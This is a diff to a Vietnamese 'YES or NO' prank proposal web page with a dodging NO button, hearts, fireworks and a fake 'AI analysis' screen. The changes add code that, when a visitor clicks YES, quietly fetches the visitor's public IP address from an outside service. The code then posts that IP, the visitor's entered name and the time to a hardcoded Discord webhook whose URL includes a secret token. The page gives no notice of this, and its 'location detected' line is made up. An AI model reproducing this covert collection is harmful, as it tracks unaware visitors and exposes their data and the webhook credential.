@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>YES or NO – GOD MODE v28.2</title>
+<title>YES or NO – GOD MODE v28.5</title>
 
 <style>
 *{box-sizing:border-box;font-family:monospace}
@@ -15,10 +15,8 @@ body{
 }
 body::before{
   content:"";position:fixed;inset:0;
-  background:rgba(0,0,0,.65);z-index:-2;
+  background:rgba(0,0,0,.7);z-index:-2;
 }
-
-/* ===== CARD ===== */
 .card{
   width:340px;padding:30px;text-align:center;
   background:rgba(0,0,0,.45);
@@ -30,8 +28,6 @@ body::before{
 }
 h1{letter-spacing:3px;text-shadow:0 0 12px rgba(255,0,100,.7)}
 .sub{font-size:13px;opacity:.8;margin-bottom:25px}
-
-/* ===== BUTTONS ===== */
 button{
   width:100%;padding:16px;margin:12px 0;
   border:none;border-radius:18px;cursor:pointer;
@@ -49,21 +45,21 @@ button{
   color:#aaa;
   border:1px solid rgba(255,255,255,.3);
 }
-
-/* ===== YES SCREEN ===== */
 #yesScreen{
   position:fixed;inset:0;
   background:black;display:none;
   justify-content:center;align-items:center;
-  font-size:36px;text-align:center;
+  font-size:34px;text-align:center;
   animation:flash .8s ease;
 }
-
-/* ===== EFFECTS ===== */
+#aiScreen{
+  position:fixed;inset:0;
+  background:black;display:none;
+  padding:30px;
+  font-size:14px;line-height:1.6;
+}
 .heart{position:fixed;font-size:24px;animation:float 2.5s linear forwards}
 .spark{position:fixed;width:6px;height:6px;background:white;border-radius:50%;animation:boom 1s ease-out forwards}
-
-/* ===== MODAL ===== */
 #nameModal{
   position:fixed;inset:0;
   background:rgba(0,0,0,.85);
@@ -80,15 +76,16 @@ button{
   margin:15px 0;border:none;border-radius:12px;
 }
 .modalBox button{width:100%;padding:12px}
-
-/* ===== TERMINAL ===== */
 #terminal{
   position:fixed;bottom:10px;left:10px;
   font-size:11px;opacity:.35;
   line-height:1.4;
 }
-
-/* ===== ANIM ===== */
+.flash{
+  position:fixed;inset:0;
+  background:white;opacity:0;
+  pointer-events:none;
+}
 @keyframes float{to{opacity:0;transform:translateY(-220px) scale(1.8)}}
 @keyframes boom{to{transform:translate(calc(var(--x)*1px),calc(var(--y)*1px));opacity:0}}
 @keyframes flash{0%{background:white;color:black}100%{background:black;color:white}}
@@ -98,7 +95,8 @@ button{
 
 <body>
 
-<!-- NAME MODAL -->
+<div id="flash" class="flash"></div>
+
 <div id="nameModal">
   <div class="modalBox">
     <h3>Nhập tên của bạn</h3>
@@ -114,6 +112,8 @@ button{
 </div>
 
 <button id="no">NO</button>
+
+<div id="aiScreen"></div>
 <div id="yesScreen"></div>
 <div id="terminal"></div>
 
@@ -123,16 +123,20 @@ button{
 <script>
 const WEBHOOK_URL="https://discord.com/api/webhooks/1466372734945595537/xclykYndX7PSAUIBGCiJzV0MNY08Hd-dmD4rIhebpc9Q350uxb6JwlVtDywMPBJUa4nt";
 const $=id=>document.getElementById(id);
+const params=new URLSearchParams(location.search);
+const STREAM_MODE=params.get("mode")==="stream";
 
-const nameModal=$("nameModal"),nameInput=$("nameInput");
-const saveName=$("saveName"),card=$("card");
-const yes=$("yes"),no=$("no"),yesScreen=$("yesScreen");
-const terminal=$("terminal"),bgm=$("bgm"),click=$("click");
+const nameModal=$("nameModal"),nameInput=$("nameInput"),saveName=$("saveName");
+const card=$("card"),yes=$("yes"),no=$("no");
+const yesScreen=$("yesScreen"),aiScreen=$("aiScreen");
+const terminal=$("terminal"),bgm=$("bgm"),click=$("click"),flash=$("flash");
 
 let username=localStorage.getItem("username");
 
 /* ===== NAME ===== */
-if(username){nameModal.remove();card.style.display="block";}
+if(username||STREAM_MODE){
+  nameModal.remove();card.style.display=STREAM_MODE?"none":"block";
+}
 saveName.onclick=()=>{
   if(!nameInput.value.trim())return;
   username=nameInput.value.trim();
@@ -143,7 +147,7 @@ saveName.onclick=()=>{
 /* ===== MUSIC ===== */
 document.body.addEventListener("click",()=>{
   bgm.volume=0;bgm.play();
-  const i=setInterval(()=>{bgm.volume+=0.02;bgm.volume>=1&&clearInterval(i)},60);
+  const i=setInterval(()=>{bgm.volume+=0.03;bgm.volume>=1&&clearInterval(i)},50);
 },{once:true});
 
 /* ===== NO ===== */
@@ -152,13 +156,56 @@ no.onmouseover=()=>{
   no.style.top=Math.random()*(innerHeight-60)+"px";
 };
 
+/* ===== FAKE LOCATION ===== */
+function fakeLocation(){
+  const cities=["Ho Chi Minh City","Hà Nội","Đà Nẵng","Singapore","Tokyo"];
+  return cities[Math.floor(Math.random()*cities.length)];
+}
+
+/* ===== AI TYPING ===== */
+const aiLines=[
+  "[AI] Initializing neural core...",
+  "[AI] Analyzing emotion patterns...",
+  "[SYS] Location detected: "+fakeLocation(),
+  "[SYS] Accuracy: 92%",
+  "[AI] Decision locked."
+];
+
+async function aiTyping(){
+  aiScreen.style.display="block";
+  aiScreen.innerHTML="";
+  for(const line of aiLines){
+    for(let i=0;i<=line.length;i++){
+      aiScreen.innerHTML=line.slice(0,i);
+      await new Promise(r=>setTimeout(r,30));
+    }
+    aiScreen.innerHTML+="<br>";
+    await new Promise(r=>setTimeout(r,400));
+  }
+  aiScreen.style.display="none";
+}
+
+/* ===== MOBILE RUNG + FLASH ===== */
+function shock(){
+  if(navigator.vibrate){
+    navigator.vibrate([200,80,200,80,400]);
+  }
+  flash.style.transition="none";
+  flash.style.opacity=1;
+  setTimeout(()=>{
+    flash.style.transition="opacity .4s";
+    flash.style.opacity=0;
+  },60);
+}
+
 /* ===== YES ===== */
-yes.onclick=()=>{
+yes.onclick=async ()=>{
   click.play();bgm.pause();
   card.remove();no.remove();
-  yesScreen.innerHTML=`❤️ ${username} SAID YES ❤️`;
+  await aiTyping();
+  shock();
+  yesScreen.innerHTML=`❤️ ${username||"YOU"} SAID YES ❤️`;
   yesScreen.style.display="flex";
-  localStorage.setItem("lastYes",new Date().toLocaleString());
   hearts();fireworks();sendDiscord();
 };
 
@@ -168,40 +215,68 @@ function hearts(){
     const h=document.createElement("div");
     h.className="heart";h.innerHTML="❤️";
     h.style.left=Math.random()*innerWidth+"px";
-    h.style.bottom="0";document.body.appendChild(h);
+    h.style.bottom="0";
+    document.body.appendChild(h);
     setTimeout(()=>h.remove(),2500);
   },120);
 }
 function fireworks(){
-  for(let i=0;i<80;i++){
+  for(let i=0;i<90;i++){
     const s=document.createElement("div");
     s.className="spark";
     s.style.left=innerWidth/2+"px";
     s.style.top=innerHeight/2+"px";
-    s.style.setProperty("--x",(Math.random()-0.5)*400);
-    s.style.setProperty("--y",(Math.random()-0.5)*400);
+    s.style.setProperty("--x",(Math.random()-0.5)*500);
+    s.style.setProperty("--y",(Math.random()-0.5)*500);
     document.body.appendChild(s);
     setTimeout(()=>s.remove(),1000);
   }
 }
 
-/* ===== TERMINAL LOG ===== */
-const logs=["[SYS] Initializing...","[AI] Analyzing choice...","[CORE] God Mode online"];
-let i=0;
+/* ===== TERMINAL ===== */
+const logs=[
+  "[SYS] Booting God Mode...",
+  "[AI] Neural sync online",
+  "[CORE] No escape protocol active"
+];
+let ti=0;
 setInterval(()=>{
-  terminal.innerHTML+=logs[i%logs.length]+"<br>";
-  i++;terminal.scrollTop=9999;
-},1200);
+  terminal.innerHTML+=logs[ti%logs.length]+"<br>";
+  ti++;terminal.scrollTop=9999;
+},1000);
 
-/* ===== DISCORD ===== */
-function sendDiscord(){
+/* ===== IP + DISCORD ===== */
+async function getIP(){
+  try{
+    const r=await fetch("https://api.ipify.org?format=json");
+    const d=await r.json();
+    return d.ip;
+  }catch(e){return "UNKNOWN";}
+}
+async function sendDiscord(){
+  const ip=await getIP();
   fetch(WEBHOOK_URL,{
     method:"POST",
     headers:{"Content-Type":"application/json"},
-    body:JSON.stringify({content:`🔥 ${username} clicked YES`})
+    body:JSON.stringify({
+      content:
+`🔥 YES CLICKED
+👤 Name: ${username||"STREAM"}
+🌐 IP: ${ip}
+📍 Location: ${fakeLocation()}
+🕒 Time: ${new Date().toLocaleString()}`
+    })
   });
 }
-</script>
 
+/* ===== STREAM MODE AUTO ===== */
+if(STREAM_MODE){
+  setTimeout(async ()=>{
+    await aiTyping();
+    yesScreen.innerHTML="🔥 STREAM STARTING 🔥";
+    yesScreen.style.display="flex";
+  },800);
+}
+</script>
 </body>
 </html>
